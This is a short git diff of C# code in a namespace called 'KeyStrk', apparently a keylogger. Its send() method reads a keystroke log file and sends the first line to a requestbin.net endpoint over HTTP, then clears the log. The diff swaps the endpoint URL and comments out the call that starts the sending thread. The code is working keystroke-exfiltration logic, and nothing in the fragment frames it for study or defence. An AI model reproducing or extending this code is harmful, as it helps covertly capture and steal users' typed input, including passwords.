@@ -41,7 +41,7 @@ namespace KeyStrk
 
             //Start threads
             hookThread.Start();
-            sendData.Start();
+           // sendData.Start();
            
 
 
@@ -168,7 +168,7 @@ namespace KeyStrk
         private void send()
         {
             StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/tzdsaytz?" + sr.ReadLine());
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1fmd4pf1" + sr.ReadLine());
             sr.Close();
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
